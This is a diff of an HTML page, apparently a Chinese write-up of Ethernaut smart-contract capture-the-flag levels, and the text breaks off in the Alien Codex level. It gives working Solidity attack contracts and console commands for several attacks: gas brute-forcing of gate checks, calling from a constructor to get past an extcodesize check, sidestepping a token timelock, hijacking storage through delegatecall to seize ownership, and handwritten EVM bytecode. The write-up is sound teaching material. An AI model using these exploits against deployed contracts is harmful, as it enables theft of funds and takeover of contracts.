+<pre><code class="language-solidity"> <span class="hljs-built_in">require</span>(<span class="hljs-title function_">uint32</span>(<span class="hljs-title function_">uint64</span>(_gateKey)) == <span class="hljs-title function_">uint16</span>(<span class="hljs-title function_">uint160</span>(tx.<span class="hljs-property">origin</span>)), <span class="hljs-string">&quot;GatekeeperOne: invalid gateThree part three&quot;</span>);
         _;
 </code></pre>
 <p>uint32 key : 00 00 d2 a2</p>
-<pre><code class="language-solidity">require(uint32(uint64(_gateKey)) != uint64(_gateKey)
+<pre><code class="language-solidity"><span class="hljs-built_in">require</span>(<span class="hljs-title function_">uint32</span>(<span class="hljs-title function_">uint64</span>(_gateKey)) != <span class="hljs-title function_">uint64</span>(_gateKey)
 </code></pre>
 <p>uint64 key : 24 5e d6 8b 00 00 d2 a2</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
-import &#39;./Gatekeeper One.sol&#39;;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./Gatekeeper One.sol&#x27;</span>;
 
-contract GatekeeperOneAttack {
+contract <span class="hljs-title class_">GatekeeperOneAttack</span> {
 
-    function attack(address _target) public {
-        IGatekeeperOne gate = IGatekeeperOne(_target);
-        bytes8 key = bytes8(uint64(uint160(tx.origin))) &amp; 0xFFFFFFFF0000FFFF;
-        for (uint256 i = 0; i &lt; 300; i++) {
-            try gate.enter{gas: 8191 * 10 + i}(key) {
-                break;
-            } catch {}
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">address _target</span>) <span class="hljs-keyword">public</span> {
+        <span class="hljs-title class_">IGatekeeperOne</span> gate = <span class="hljs-title class_">IGatekeeperOne</span>(_target);
+        bytes8 key = <span class="hljs-title function_">bytes8</span>(<span class="hljs-title function_">uint64</span>(<span class="hljs-title function_">uint160</span>(tx.<span class="hljs-property">origin</span>))) &amp; <span class="hljs-number">0xFFFFFFFF0000FFFF</span>;
+        <span class="hljs-keyword">for</span> (uint256 i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">300</span>; i++) {
+            <span class="hljs-keyword">try</span> gate.<span class="hljs-property">enter</span>{<span class="hljs-attr">gas</span>: <span class="hljs-number">8191</span> * <span class="hljs-number">10</span> + i}(key) {
+                <span class="hljs-keyword">break</span>;
+            } <span class="hljs-keyword">catch</span> {}
         }
     }
 }
 </code></pre>
 <h1>gatekeeper two</h1><p>注册成为参赛者以通过此关卡</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-contract GatekeeperTwo {
-    address public entrant;
+contract <span class="hljs-title class_">GatekeeperTwo</span> {
+    address <span class="hljs-keyword">public</span> entrant;
 
-    modifier gateOne() {
-        require(msg.sender != tx.origin);
+    modifier <span class="hljs-title function_">gateOne</span>(<span class="hljs-params"></span>) {
+        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">sender</span> != tx.<span class="hljs-property">origin</span>);
         _;
     }
 
-    modifier gateTwo() {
+    modifier <span class="hljs-title function_">gateTwo</span>(<span class="hljs-params"></span>) {
         uint256 x;
         assembly {
-            x := extcodesize(caller())
+            x := <span class="hljs-title function_">extcodesize</span>(<span class="hljs-title function_">caller</span>())
         }
-        require(x == 0);
+        <span class="hljs-built_in">require</span>(x == <span class="hljs-number">0</span>);
         _;
     }
 
-    modifier gateThree(bytes8 _gateKey) {
-        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
+    modifier <span class="hljs-title function_">gateThree</span>(<span class="hljs-params">bytes8 _gateKey</span>) {
+        <span class="hljs-built_in">require</span>(<span class="hljs-title function_">uint64</span>(<span class="hljs-title function_">bytes8</span>(<span class="hljs-title function_">keccak256</span>(abi.<span class="hljs-title function_">encodePacked</span>(msg.<span class="hljs-property">sender</span>)))) ^ <span class="hljs-title function_">uint64</span>(_gateKey) == <span class="hljs-title function_">type</span>(uint64).<span class="hljs-property">max</span>);
         _;
     }
 
-    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
-        entrant = tx.origin;
-        return true;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">enter</span>(<span class="hljs-params">bytes8 _gateKey</span>) <span class="hljs-keyword">public</span> gateOne gateTwo <span class="hljs-title function_">gateThree</span>(_gateKey) <span class="hljs-title function_">returns</span> (bool) {
+        entrant = tx.<span class="hljs-property">origin</span>;
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
     }
 }
 </code></pre>
@@ -703,58 +703,58 @@ contract GatekeeperTwo {
 </ul>
 <p>因此这条 <code>require(x == 0)</code> 的意图通常是“<strong>只允许外部账户调用</strong>，<strong>不允许普通合约调用</strong>”。<br>但有个例外：<strong>合约在其构造函数执行期间，本地址的代码还没有写入链上</strong>，所以 <code>extcodesize(address_of_this_contract)</code> 在构造阶段会返回 <code>0</code>。这是 EVM 的一个特性，也是常见的绕过手段。</p>
 <p>3、gateThree() 一步步转换类型即可</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
-import &#39;./Gatekeeper One.sol&#39;;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./Gatekeeper One.sol&#x27;</span>;
 
-contract GatekeeperOneAttack {
-    constructor(address gatekeeperAddress) {
-        IGatekeeperOne gate = IGatekeeperOne(gatekeeperAddress);
-        // 如果 gateThree 的校验是： uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
-        // 那么要生成 key = ~uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))
-        // 在这里 msg.sender 对目标合约来说就是 address(this)（攻击合约）
-        bytes8 h = bytes8(keccak256(abi.encodePacked(address(this))));
-        uint64 hv = uint64(h);
-        uint64 keyNum = hv ^ type(uint64).max; // 或者: ~hv
-        bytes8 key = bytes8(keyNum);
-        // 直接在 constructor 中调用目标合约
-        gate.enter(key);
+contract <span class="hljs-title class_">GatekeeperOneAttack</span> {
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">address gatekeeperAddress</span>) {
+        <span class="hljs-title class_">IGatekeeperOne</span> gate = <span class="hljs-title class_">IGatekeeperOne</span>(gatekeeperAddress);
+        <span class="hljs-comment">// 如果 gateThree 的校验是： uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max</span>
+        <span class="hljs-comment">// 那么要生成 key = ~uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</span>
+        <span class="hljs-comment">// 在这里 msg.sender 对目标合约来说就是 address(this)（攻击合约）</span>
+        bytes8 h = <span class="hljs-title function_">bytes8</span>(<span class="hljs-title function_">keccak256</span>(abi.<span class="hljs-title function_">encodePacked</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>))));
+        uint64 hv = <span class="hljs-title function_">uint64</span>(h);
+        uint64 keyNum = hv ^ <span class="hljs-title function_">type</span>(uint64).<span class="hljs-property">max</span>; <span class="hljs-comment">// 或者: ~hv</span>
+        bytes8 key = <span class="hljs-title function_">bytes8</span>(keyNum);
+        <span class="hljs-comment">// 直接在 constructor 中调用目标合约</span>
+        gate.<span class="hljs-title function_">enter</span>(key);
     }
 }
 </code></pre>
 <h1>Naught Coin ERC20代币</h1><p>NaughtCoin是一种ERC20代币，而你已经持有了所有的代币。问题在于，你只能在10年的锁定期结束后才能转移它们。你能想办法把代币转到另一个地址，以便自由转移吗？将你的代币余额降至0即可完成此关卡。</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span>;
 
-contract NaughtCoin is ERC20 {
-    // string public constant name = &#39;NaughtCoin&#39;;
-    // string public constant symbol = &#39;0x0&#39;;
-    // uint public constant decimals = 18;
-    uint256 public timeLock = block.timestamp + 10 * 365 days;
-    uint256 public INITIAL_SUPPLY;
-    address public player;
+contract <span class="hljs-title class_">NaughtCoin</span> is <span class="hljs-title class_">ERC20</span> {
+    <span class="hljs-comment">// string public constant name = &#x27;NaughtCoin&#x27;;</span>
+    <span class="hljs-comment">// string public constant symbol = &#x27;0x0&#x27;;</span>
+    <span class="hljs-comment">// uint public constant decimals = 18;</span>
+    uint256 <span class="hljs-keyword">public</span> timeLock = block.<span class="hljs-property">timestamp</span> + <span class="hljs-number">10</span> * <span class="hljs-number">365</span> days;
+    uint256 <span class="hljs-keyword">public</span> <span class="hljs-variable constant_">INITIAL_SUPPLY</span>;
+    address <span class="hljs-keyword">public</span> player;
 
-    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) {
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">address _player</span>) <span class="hljs-title class_">ERC20</span>(<span class="hljs-string">&quot;NaughtCoin&quot;</span>, <span class="hljs-string">&quot;0x0&quot;</span>) {
         player = _player;
-        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
-        // _totalSupply = INITIAL_SUPPLY;
-        // _balances[player] = INITIAL_SUPPLY;
-        _mint(player, INITIAL_SUPPLY);
-        emit Transfer(address(0), player, INITIAL_SUPPLY);
+        <span class="hljs-variable constant_">INITIAL_SUPPLY</span> = <span class="hljs-number">1000000</span> * (<span class="hljs-number">10</span> ** <span class="hljs-title function_">uint256</span>(<span class="hljs-title function_">decimals</span>()));
+        <span class="hljs-comment">// _totalSupply = INITIAL_SUPPLY;</span>
+        <span class="hljs-comment">// _balances[player] = INITIAL_SUPPLY;</span>
+        <span class="hljs-title function_">_mint</span>(player, <span class="hljs-variable constant_">INITIAL_SUPPLY</span>);
+        emit <span class="hljs-title class_">Transfer</span>(<span class="hljs-title function_">address</span>(<span class="hljs-number">0</span>), player, <span class="hljs-variable constant_">INITIAL_SUPPLY</span>);
     }
 
-    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
-        super.transfer(_to, _value);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">address _to, uint256 _value</span>) <span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> lockTokens <span class="hljs-title function_">returns</span> (bool) {
+        <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">transfer</span>(_to, _value);
     }
 
-    // Prevent the initial owner from transferring tokens until the timelock has passed
-    modifier lockTokens() {
-        if (msg.sender == player) {
-            require(block.timestamp &gt; timeLock);
+    <span class="hljs-comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span>
+    modifier <span class="hljs-title function_">lockTokens</span>(<span class="hljs-params"></span>) {
+        <span class="hljs-keyword">if</span> (msg.<span class="hljs-property">sender</span> == player) {
+            <span class="hljs-built_in">require</span>(block.<span class="hljs-property">timestamp</span> &gt; timeLock);
             _;
-        } else {
+        } <span class="hljs-keyword">else</span> {
             _;
         }
     }
@@ -782,125 +782,125 @@ contract NaughtCoin is ERC20 {
 <td>spender 代为转出</td>
 </tr>
 </tbody></table>
-<pre><code class="language-python">await contract.approve(player, await contract.balanceOf(player))
-await contract.transferFrom(player, &quot;0xb5D90200E89F7e3AC01cA1A6A2E34987C55E4049&quot;, await contract.balanceOf(player))
+<pre><code class="language-python"><span class="hljs-keyword">await</span> contract.approve(player, <span class="hljs-keyword">await</span> contract.balanceOf(player))
+<span class="hljs-keyword">await</span> contract.transferFrom(player, <span class="hljs-string">&quot;0xb5D90200E89F7e3AC01cA1A6A2E34987C55E4049&quot;</span>, <span class="hljs-keyword">await</span> contract.balanceOf(player))
 //看余额
-(await contract.balanceOf(player) / 1e18).toString()
+(<span class="hljs-keyword">await</span> contract.balanceOf(player) / <span class="hljs-number">1e18</span>).toString()
 </code></pre>
 <h1>preservation 代理攻击</h1><p>本合同使用一个库来存储两个不同时区的两个不同时间。构造函数为每个要存储的时间创建该库的两个实例。</p>
 <p>目标拿下合同所有权</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-contract Preservation {
-  // public library contracts
-  address public timeZone1Library;
-  address public timeZone2Library;
-  address public owner;
+contract <span class="hljs-title class_">Preservation</span> {
+  <span class="hljs-comment">// public library contracts</span>
+  address <span class="hljs-keyword">public</span> timeZone1Library;
+  address <span class="hljs-keyword">public</span> timeZone2Library;
+  address <span class="hljs-keyword">public</span> owner;
   uint256 storedTime;
-  // Sets the function signature for delegatecall
-  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));
+  <span class="hljs-comment">// Sets the function signature for delegatecall</span>
+  bytes4 constant setTimeSignature = <span class="hljs-title function_">bytes4</span>(<span class="hljs-title function_">keccak256</span>(<span class="hljs-string">&quot;setTime(uint256)&quot;</span>));
 
-  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
+  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">address _timeZone1LibraryAddress, address _timeZone2LibraryAddress</span>) {
     timeZone1Library = _timeZone1LibraryAddress;
     timeZone2Library = _timeZone2LibraryAddress;
-    owner = msg.sender;
+    owner = msg.<span class="hljs-property">sender</span>;
   }
 
-  // set the time for timezone 1
-  function setFirstTime(uint256 _timeStamp) public {
-    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+  <span class="hljs-comment">// set the time for timezone 1</span>
+  <span class="hljs-keyword">function</span> <span class="hljs-title function_">setFirstTime</span>(<span class="hljs-params">uint256 _timeStamp</span>) <span class="hljs-keyword">public</span> {
+    timeZone1Library.<span class="hljs-title function_">delegatecall</span>(abi.<span class="hljs-title function_">encodePacked</span>(setTimeSignature, _timeStamp));
   }
 
-  // set the time for timezone 2
-  function setSecondTime(uint256 _timeStamp) public {
-    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+  <span class="hljs-comment">// set the time for timezone 2</span>
+  <span class="hljs-keyword">function</span> <span class="hljs-title function_">setSecondTime</span>(<span class="hljs-params">uint256 _timeStamp</span>) <span class="hljs-keyword">public</span> {
+    timeZone2Library.<span class="hljs-title function_">delegatecall</span>(abi.<span class="hljs-title function_">encodePacked</span>(setTimeSignature, _timeStamp));
   }
 }
 
-// Simple library contract to set the time
-contract LibraryContract {
-  // stores a timestamp
+<span class="hljs-comment">// Simple library contract to set the time</span>
+contract <span class="hljs-title class_">LibraryContract</span> {
+  <span class="hljs-comment">// stores a timestamp</span>
   uint256 storedTime;
 
-  function setTime(uint256 _time) public {
+  <span class="hljs-keyword">function</span> <span class="hljs-title function_">setTime</span>(<span class="hljs-params">uint256 _time</span>) <span class="hljs-keyword">public</span> {
     storedTime = _time;
   }
 }
 </code></pre>
 <p>合约中用到了delegatecall()函数，一般情况下delegatecall用来调用其他合约、库的函数，比如** a 合约中调用 b 合约的函数，但执行该函数使用的 storage是a的**</p>
 <p>调用setFirstTime函数时候实际通过delegatecall 执行了LibraryContract的setTime函数，修改了slot 1，也就是修改了timeZone1Library变量。这样，我们第一次调用setFirstTime将timeZone1Library变量修改为我们的恶意合约的地址，第二次调用setFirstTime就可以执行我们的任意代码了。</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
 contract attack{
-    address public timeZone1Library;
-    address public timeZone2Library;//占位的，让owner属于slot[2]
-    address public owner;
+    address <span class="hljs-keyword">public</span> timeZone1Library;
+    address <span class="hljs-keyword">public</span> timeZone2Library;<span class="hljs-comment">//占位的，让owner属于slot[2]</span>
+    address <span class="hljs-keyword">public</span> owner;
 
-    function setTime(uint256 _time) public {
-        owner = 0xdE3d99ec73f3ce95f0634424245Ed68B01eBd2A2;
-        _time=_time;//单纯为了不报警告，美观
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">setTime</span>(<span class="hljs-params">uint256 _time</span>) <span class="hljs-keyword">public</span> {
+        owner = <span class="hljs-number">0xdE3d99ec73f3ce95f0634424245Ed68B01eBd2A2</span>;
+        _time=_time;<span class="hljs-comment">//单纯为了不报警告，美观</span>
     }
 
 }
 </code></pre>
-<pre><code class="language-solidity">await contract.address
-&#39;0xAF92c31A3d1176C36C6aDAf9a5c99a2da9d2f1Df&#39;
+<pre><code class="language-solidity"><span class="hljs-keyword">await</span> contract.<span class="hljs-property">address</span>
+<span class="hljs-string">&#x27;0xAF92c31A3d1176C36C6aDAf9a5c99a2da9d2f1Df&#x27;</span>
 
-await web3.eth.getStorageAt(&quot;0xAF92c31A3d1176C36C6aDAf9a5c99a2da9d2f1Df&quot;, 0)
-&#39;0x000000000000000000000000f88ed7d1dfcd1bb89a975662fd7cb536058f3a30&#39;
+<span class="hljs-keyword">await</span> web3.<span class="hljs-property">eth</span>.<span class="hljs-title function_">getStorageAt</span>(<span class="hljs-string">&quot;0xAF92c31A3d1176C36C6aDAf9a5c99a2da9d2f1Df&quot;</span>, <span class="hljs-number">0</span>)
+<span class="hljs-string">&#x27;0x000000000000000000000000f88ed7d1dfcd1bb89a975662fd7cb536058f3a30&#x27;</span>
 
-await contract.setFirstTime(&#39;0xA2Fc9C8292c932153509a494434499D94Fd9fBA9&#39;)
-{tx: &#39;0x5174bbbf97632aeef7c9e032bb1adbd7d9d8c0413c4369b6577db61b704983dd&#39;, receipt: {…}, logs: Array(0)}
+<span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">setFirstTime</span>(<span class="hljs-params"><span class="hljs-string">&#x27;0xA2Fc9C8292c932153509a494434499D94Fd9fBA9&#x27;</span></span>)
+{<span class="hljs-attr">tx</span>: <span class="hljs-string">&#x27;0x5174bbbf97632aeef7c9e032bb1adbd7d9d8c0413c4369b6577db61b704983dd&#x27;</span>, <span class="hljs-attr">receipt</span>: {…}, <span class="hljs-attr">logs</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">0</span>)}
 
-//地址改为恶意合约的
-await web3.eth.getStorageAt(&quot;0xAF92c31A3d1176C36C6aDAf9a5c99a2da9d2f1Df&quot;, 0)
-&#39;0x000000000000000000000000a2fc9c8292c932153509a494434499d94fd9fba9&#39;
+<span class="hljs-comment">//地址改为恶意合约的</span>
+<span class="hljs-keyword">await</span> web3.<span class="hljs-property">eth</span>.<span class="hljs-title function_">getStorageAt</span>(<span class="hljs-string">&quot;0xAF92c31A3d1176C36C6aDAf9a5c99a2da9d2f1Df&quot;</span>, <span class="hljs-number">0</span>)
+<span class="hljs-string">&#x27;0x000000000000000000000000a2fc9c8292c932153509a494434499d94fd9fba9&#x27;</span>
 
-await contract.setFirstTime(&#39;1&#39;)//触发owner改变
-{tx: &#39;0x5be6601ba4cd0cdf86616d5e5fcb90965e4ed050ded7017e679ee83b27647313&#39;, receipt: {…}, logs: Array(0)}
+<span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">setFirstTime</span>(<span class="hljs-string">&#x27;1&#x27;</span>)<span class="hljs-comment">//触发owner改变</span>
+{<span class="hljs-attr">tx</span>: <span class="hljs-string">&#x27;0x5be6601ba4cd0cdf86616d5e5fcb90965e4ed050ded7017e679ee83b27647313&#x27;</span>, <span class="hljs-attr">receipt</span>: {…}, <span class="hljs-attr">logs</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">0</span>)}
 
-await contract.owner()
-&#39;0xdE3d99ec73f3ce95f0634424245Ed68B01eBd2A2&#39;
+<span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">owner</span>()
+<span class="hljs-string">&#x27;0xdE3d99ec73f3ce95f0634424245Ed68B01eBd2A2&#x27;</span>
 </code></pre>
 <h1>recovery</h1><p>一位合约创建者构建了一个非常简单的代币工厂合约。任何人都能轻松创建新代币。部署第一个代币合约后，创建者发送了0.001以太币以获取更多代币。此后，他们丢失了该合约地址。</p>
 <p>从丢失的合约地址中找回（或移除）<code>0.001</code>以太币，此关卡即告完成。</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-contract Recovery {
-    //generate tokens
-    function generateToken(string memory _name, uint256 _initialSupply) public {
-        new SimpleToken(_name, msg.sender, _initialSupply);
+contract <span class="hljs-title class_">Recovery</span> {
+    <span class="hljs-comment">//generate tokens</span>
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">generateToken</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> memory _name, uint256 _initialSupply</span>) <span class="hljs-keyword">public</span> {
+        <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleToken</span>(_name, msg.<span class="hljs-property">sender</span>, _initialSupply);
     }
 }
 
-contract SimpleToken {
-    string public name;
-    mapping(address =&gt; uint256) public balances;
+contract <span class="hljs-title class_">SimpleToken</span> {
+    <span class="hljs-built_in">string</span> <span class="hljs-keyword">public</span> name;
+    <span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint256) <span class="hljs-keyword">public</span> balances;
 
-    // constructor
-    constructor(string memory _name, address _creator, uint256 _initialSupply) {
+    <span class="hljs-comment">// constructor</span>
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> memory _name, address _creator, uint256 _initialSupply</span>) {
         name = _name;
         balances[_creator] = _initialSupply;
     }
 
-    // collect ether in return for tokens
-    receive() external payable {
-        balances[msg.sender] = msg.value * 10;
+    <span class="hljs-comment">// collect ether in return for tokens</span>
+    <span class="hljs-title function_">receive</span>() external payable {
+        balances[msg.<span class="hljs-property">sender</span>] = msg.<span class="hljs-property">value</span> * <span class="hljs-number">10</span>;
     }
 
-    // allow transfers of tokens
-    function transfer(address _to, uint256 _amount) public {
-        require(balances[msg.sender] &gt;= _amount);
-        balances[msg.sender] = balances[msg.sender] - _amount;
+    <span class="hljs-comment">// allow transfers of tokens</span>
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params">address _to, uint256 _amount</span>) <span class="hljs-keyword">public</span> {
+        <span class="hljs-built_in">require</span>(balances[msg.<span class="hljs-property">sender</span>] &gt;= _amount);
+        balances[msg.<span class="hljs-property">sender</span>] = balances[msg.<span class="hljs-property">sender</span>] - _amount;
         balances[_to] = _amount;
     }
 
-    // clean up after ourselves
-    function destroy(address payable _to) public {
-        selfdestruct(_to);
+    <span class="hljs-comment">// clean up after ourselves</span>
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">destroy</span>(<span class="hljs-params">address payable _to</span>) <span class="hljs-keyword">public</span> {
+        <span class="hljs-title function_">selfdestruct</span>(_to);
     }
 }
 </code></pre>
@@ -912,10 +912,10 @@ contract SimpleToken {
 <p>我们直接用小狐狸去区块链浏览器查找本题的交易，找到新合约地址，直接调用自毁函数向我们账户转账</p>
 <p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/2672cb4912fd7f038fe0272d47d53df9_MD5.png" alt=""></p>
 <p>remix写调用接口脚本，部署时用at address选项写入找到的地址，调用接口</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
-interface ISimpleToken {
-    function destroy(address payable _to) external;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
+<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ISimpleToken</span> {
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">destroy</span>(<span class="hljs-params">address payable _to</span>) external;
 }
 </code></pre>
 <p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/5a800fb50fdfead773e38ad2e0f9682f_MD5.png" alt=""></p>
@@ -924,19 +924,19 @@ interface ISimpleToken {
 <p>The solver&#39;s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin&#39; really really itty-bitty tiny: 10 bytes at most.求解器的代码必须非常精简。真的非常非常精简。简直是小得离谱的那种精简：最多10字节。</p>
 <p>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That&#39;s right: Raw EVM bytecode.提示：或许是时候暂时离开Solidity编译器的舒适区，手动构建这个了，哦？没错：就是原始的EVM字节码。</p>
 <p>Good luck! 祝你好运！</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-contract MagicNum {
-    address public solver;
+contract <span class="hljs-title class_">MagicNum</span> {
+    address <span class="hljs-keyword">public</span> solver;
 
-    constructor() {}
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) {}
 
-    function setSolver(address _solver) public {
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">setSolver</span>(<span class="hljs-params">address _solver</span>) <span class="hljs-keyword">public</span> {
         solver = _solver;
     }
 
-    /*
+    <span class="hljs-comment">/*
     ____________/\\\_______/\\\\\\\\\_____        
      __________/\\\\\_____/\\\///////\\\___       
       ________/\\\/\\\____\///______\//\\\__      
@@ -946,7 +946,7 @@ contract MagicNum {
           _\///////////\\\//____/\\\/___________  
            ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
             ___________\///_____\///////////////__
-    */
+    */</span>
 }
 </code></pre>
 <p>题目致敬一部电影，要求返回值为42，即2a</p>
@@ -1010,9 +1010,9 @@ contract MagicNum {
 <p>为什么必须返回 32 字节？</p>
 <p>EVM 的 <code>RETURN</code> 指令是原始的内存返回机制：它按你给的 <code>offset</code> 和 <code>size</code> 返回任意字节数。<strong>Solidity ABI</strong>（以及大多数高层调用者）期望 <code>uint256</code> 类型在返回时是 32 字节对齐的（高位补零）。为了兼容外部调用（关卡合约会用 <code>uint256</code> 比较），我们返回完整 32 字节是稳妥且正确的做法。题目也通常会用 <code>uint256</code> 类型，所以返回 32 字节是自然选择。</p>
 <p>（理论上你可以用 <code>RETURN</code> 返回更少的字节，只要调用方如何解析那段数据也匹配，但对应 Ethernaut 的检查，它会把返回值解释为 <code>uint256</code> 并进行比较，所以必须是 32 字节格式化的 42。）</p>
-<pre><code class="language-solidity">var bytecode = &quot;0x600a600c600039600a6000f3602A60805260206080f3&quot;;
-web3.eth.sendTransaction({ from: player, data: bytecode }, function(err,res){console.log(res)});
-await contract.setSolver(&quot;contract address&quot;);
+<pre><code class="language-solidity"><span class="hljs-keyword">var</span> bytecode = <span class="hljs-string">&quot;0x600a600c600039600a6000f3602A60805260206080f3&quot;</span>;
+web3.<span class="hljs-property">eth</span>.<span class="hljs-title function_">sendTransaction</span>({ <span class="hljs-attr">from</span>: player, <span class="hljs-attr">data</span>: bytecode }, <span class="hljs-keyword">function</span>(<span class="hljs-params">err,res</span>){<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)});
+<span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">setSolver</span>(<span class="hljs-string">&quot;contract address&quot;</span>);
 钱包进区块链浏览器看新合约地址
 </code></pre>
 <table>
@@ -1036,33 +1036,33 @@ await contract.setSolver(&quot;contract address&quot;);
 </tr>
 </tbody></table>
 <h1><strong>Alien Codex  动态数组在storage存放位置</strong></h1><p>认领所有权</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.5.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.5</span><span class="hljs-number">.0</span>;
 
-import &quot;../helpers/Ownable-05.sol&quot;;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;../helpers/Ownable-05.sol&quot;</span>;
 
-contract AlienCodex is Ownable {
-    bool public contact;
-    bytes32[] public codex;
+contract <span class="hljs-title class_">AlienCodex</span> is <span class="hljs-title class_">Ownable</span> {
+    bool <span class="hljs-keyword">public</span> contact;
+    bytes32[] <span class="hljs-keyword">public</span> codex;
 
-    modifier contacted() {
-        assert(contact);
+    modifier <span class="hljs-title function_">contacted</span>(<span class="hljs-params"></span>) {
+        <span class="hljs-title function_">assert</span>(contact);
         _;
     }
 
-    function makeContact() public {
-        contact = true;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">makeContact</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> {
+        contact = <span class="hljs-literal">true</span>;
     }
 
-    function record(bytes32 _content) public contacted {
-        codex.push(_content);
